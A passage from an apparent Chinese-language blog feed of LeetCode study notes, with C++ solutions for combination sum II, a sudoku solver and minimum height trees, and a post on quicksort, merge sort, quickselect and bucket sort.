class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combinationSum2</span>(vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">onPath</span><span class="params">(candidates.size(), <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="built_in">dfs</span>(res, temp, onPath, candidates, <span class="number">0</span>, <span class="number">0</span>, target);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; res, vector&lt;<span class="type">int</span>&gt;&amp; candidate, vector&lt;<span class="type">bool</span>&gt;&amp; onPath, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> depth, <span class="type">int</span> sum, <span class="type">const</span> <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(candidate);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = depth; i &lt; candidates.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            candidate.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            onPath[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || candidates[i] != candidates[i - <span class="number">1</span>] || (candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; onPath[i - <span class="number">1</span>])) </span><br><span class="line">              <span class="built_in">dfs</span>(res, candidate, onPath, candidates, i + <span class="number">1</span>, sum, target);</span><br><span class="line">            candidate.<span class="built_in">pop_back</span>();</span><br><span class="line">            onPath[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：主要是需要记录相同的值的出现情况。做完这道题也可以尝试<a href="https://leetcode.cn/problems/permutations-ii">全排列 II</a></p></li><li><p>题目三：<a href="https://leetcode.cn/problems/sudoku-solver">解数独</a><br>编写一个程序，通过填充空格来解决数独问题。<br>数独的解法需遵循如下规则：</p><ul><li>数字1-9在每一行只能出现一次。</li><li>数字1-9在每一列只能出现一次。</li><li>数字1-9在每一个以粗实线分隔的3x3宫内只能出现一次。（请参考示例图）<br>数独部分空格内已填入了数字，空白格用’.’表示。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2021/04/12/250px-sudoku-by-l2g-20050714svg.png" alt="示例图"></li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; hash1;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; hash2;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; hash3;</span><br><span class="line">    <span class="type">bool</span> valid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Solution</span>() : <span class="built_in">hash1</span>(<span class="number">9</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">9</span>, <span class="literal">false</span>)), <span class="built_in">hash2</span>(<span class="number">9</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">9</span>, <span class="literal">false</span>)), <span class="built_in">hash3</span>(<span class="number">9</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(<span class="number">9</span>, <span class="literal">false</span>)), <span class="built_in">valid</span>(<span class="literal">false</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">solveSudoku</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; locations;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    locations.<span class="built_in">push_back</span>(&#123;i, j&#125;);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                hash1[i][board[i][j] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                hash2[j][board[i][j] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][board[i][j] - <span class="string">&#x27;0&#x27;</span> - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> size = locations.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">dfs</span>(board, locations, <span class="number">0</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">const</span> vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; locations, <span class="type">int</span> depth, <span class="type">const</span> <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == size) &#123;</span><br><span class="line">            valid = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> [i, j] = locations[depth];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt; <span class="number">10</span> &amp;&amp; !valid; ++k) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!hash1[i][k - <span class="number">1</span>] &amp;&amp; !hash2[j][k - <span class="number">1</span>] &amp;&amp; !hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][k - <span class="number">1</span>]) &#123;</span><br><span class="line">                hash1[i][k - <span class="number">1</span>] = hash2[j][k - <span class="number">1</span>] = hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][k - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">                board[i][j] = k + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="built_in">dfs</span>(board, locations, depth + <span class="number">1</span>, size);</span><br><span class="line">                hash1[i][k - <span class="number">1</span>] = hash2[j][k - <span class="number">1</span>] = hash3[(i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>][k - <span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：暴力的深度搜索即可，记得记录状态。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/minimum-height-trees">最小深度树</a><br>树是一个无向图，其中任何两个顶点只通过一条路径连接。换句话说，任何一个没有简单环路的连通图都是一棵树。<br>给你一棵包含n个节点的树，标记为0到n-1。给定数字n和一个有n-1条无向边的edges列表(每一个边都是一对标签)，其中edges[i]&#x3D;[ai, bi]表示树中节点ai和bi之间存在一条无向边。可选择树中任何一个节点作为根。当选择节点x作为根节点时，设结果树的高度为h。在所有可能的树中，具有最小高度的树(即，min(h))被称为最小高度树 。<br>请你找到所有的最小高度树并按任意顺序返回它们的根节点标签列表。<br><img src="https://assets.leetcode.com/uploads/2020/09/01/e1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findMinHeightTrees</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;edges)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adj</span>(n);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">degree</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            adj[edge[<span class="number">0</span>]].<span class="built_in">push_back</span>(edge[<span class="number">1</span>]);</span><br><span class="line">            adj[edge[<span class="number">1</span>]].<span class="built_in">push_back</span>(edge[<span class="number">0</span>]);</span><br><span class="line">            degree[edge[<span class="number">0</span>]]++;</span><br><span class="line">            degree[edge[<span class="number">1</span>]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (degree[i] == <span class="number">1</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> remainingNodes = n;</span><br><span class="line">        <span class="keyword">while</span> (remainingNodes &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            remainingNodes -= levelSize;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; ++i) &#123;</span><br><span class="line">                <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> v : adj[u]) &#123;</span><br><span class="line">                    degree[v]--;</span><br><span class="line">                    <span class="keyword">if</span> (degree[v] == <span class="number">1</span>) q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(q.<span class="built_in">front</span>());</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要用到图论的知识——拓扑排序。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 搜索算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(四): 排序</title>
      <link href="/post/860c4f6f.html"/>
      <url>/post/860c4f6f.html</url>
      
        <content type="html"><![CDATA[<p>排序算法：包括快排，归并排序，桶排序，哈希排序等。</p><h2 id="一、快排"><a href="#一、快排" class="headerlink" title="一、快排"></a>一、快排</h2><ul><li><p>算法介绍：对于当前一个未排序片段，我们先随机选择一个位置当作中枢点，然后通过遍历操作，将所有比中枢点小的数字移动到其左侧，再将所有比中枢点大的数字移动到其右侧。操作完成后，我们再次对中枢点左右侧的片段再次进行快速排序即可。可证明，如果中枢点选取是随机的，那么该算法的平均复杂度可以达到<code>O(nlogn)</code>，最差情况下复杂度则为<code>O(n^2)</code>。</p></li><li><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">int</span> pivot = l + (<span class="built_in">rand</span>() % (r - l + <span class="number">1</span>));</span><br><span class="line">  <span class="type">int</span> pivot_val = nums[pivot];</span><br><span class="line">  <span class="built_in">swap</span>(nums[l], nums[pivot]);</span><br><span class="line">  <span class="type">int</span> i = l + <span class="number">1</span>, j = r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[j] &gt;= pivot_val) --j;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[i] &lt;= pivot_val) ++i;</span><br><span class="line">      <span class="keyword">if</span> (i == j) <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">swap</span>(nums[i], nums[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> new_pivot = nums[i] &lt;= nums[l] ? i : i - <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">swap</span>(nums[l], nums[new_pivot]);</span><br><span class="line">  <span class="built_in">quickSort</span>(nums, l, new_pivot - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">quickSort</span>(nums, new_pivot + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>补充：枢纽pivot的选择有三点平均法，末尾法，首值法，但是随机取的效率貌似是最好的，所以快排又叫做随机排序法(不稳定的排序)。</p></li></ul><h2 id="二、归并排序"><a href="#二、归并排序" class="headerlink" title="二、归并排序"></a>二、归并排序</h2><ul><li><p>算法介绍：主要用到分治的思想，对于一个未排序片段，我们可以先分别排序其左半侧和右半侧，然后将两侧重新组合（“治”）；排序每个半侧时可以通过递归再次把它切分成两侧（“分”）。</p></li><li><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mergeSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, vector&lt;<span class="type">int</span>&gt; &amp;cache, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">mergeSort</span>(nums, cache, l, mid);</span><br><span class="line">  <span class="built_in">mergeSort</span>(nums, cache, mid + <span class="number">1</span>, r);</span><br><span class="line">  <span class="type">int</span> i = l, j = mid + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> pos = l; pos &lt;= r; ++pos) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j &gt; r || (i &lt;= mid &amp;&amp; nums[i] &lt;= nums[j])) &#123;</span><br><span class="line">          cache[pos] = nums[i++];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          cache[pos] = nums[j++];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> pos = l; pos &lt;= r; ++pos) &#123;</span><br><span class="line">      nums[pos] = cache[pos];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>补充：归并排序是稳定的排序，复杂度也是<code>O(nlogn)</code>，但是实际速度不如快排。</p></li></ul><h2 id="三、快速选择"><a href="#三、快速选择" class="headerlink" title="三、快速选择"></a>三、快速选择</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/kth-largest-element-in-an-array">数组中的第K个最大元素</a><br>在一个未排序的数组中，找到第k大的数字。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> pivot = <span class="built_in">rand</span>() % len;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; larger;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; smaller;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; equal;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[pivot]) </span><br><span class="line">                larger.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] == nums[pivot])</span><br><span class="line">                equal.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                smaller.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> largerLen = larger.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> smallerLen = smaller.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> equalLen = equal.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (largerLen == k - <span class="number">1</span> || (largerLen &lt; k &amp;&amp; equalLen + largerLen &gt;= k))</span><br><span class="line">            <span class="keyword">return</span> nums[pivot];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (largerLen &gt;= k)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findKthLargest</span>(larger, k);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findKthLargest</span>(smaller, k - largerLen - equalLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：利用快排的思想，只需要找到某个pivot即可。</p></li></ul><h2 id="四、桶排序"><a href="#四、桶排序" class="headerlink" title="四、桶排序"></a>四、桶排序</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/top-k-frequent-elements">前k个高频元素</a><br>给你一个整数数组nums和一个整数k，请你返回其中出现频率前k高的元素。你可以按<strong>任意顺序</strong>返回答案。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            ++map[num];</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; reMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [key, val] : map) &#123;</span><br><span class="line">            reMap[val].<span class="built_in">push_back</span>(key);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>(); i &gt;= <span class="number">0</span> &amp;&amp; k &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (reMap[i].<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; reMap[i].<span class="built_in">size</span>() &amp;&amp; k &gt; <span class="number">0</span>; ++j) &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(reMap[i][j]);</span><br><span class="line">                    --k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用hashMap可以减少存储空间。</p></li></ul><h2 id="五、练习"><a href="#五、练习" class="headerlink" title="五、练习"></a>五、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/sort-characters-by-frequency">根据字符出现频率排序</a><br>给定一个字符串s，根据字符出现的频率对其进行<strong>降序排序</strong>。一个字符出现的频率是它出现在字符串中的次数。返回<strong>已排序的字符串</strong>。如果有多个答案，返回其中任何一个。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">frequencySort</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : s) &#123;</span><br><span class="line">            ++map[c];</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">char</span>&gt;&gt; reMap;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [key, val] : map) &#123;</span><br><span class="line">            reMap[val].<span class="built_in">push_back</span>(key);</span><br><span class="line">        &#125;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = s.<span class="built_in">length</span>(); i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (reMap[i].<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> c : reMap[i]) &#123;</span><br><span class="line">                    <span class="function">string <span class="title">tmp</span><span class="params">(i, c)</span></span>;</span><br><span class="line">                    res += tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：桶排序的变式。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/sort-colors">颜色排序</a><br>给定一个包含红色、白色和蓝色、共n个元素的数组nums，<strong>原地</strong>对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。我们使用整数0、1和2分别表示红色、白色和蓝色。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">sortColors</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ptr0 = <span class="number">0</span>, ptr1 = <span 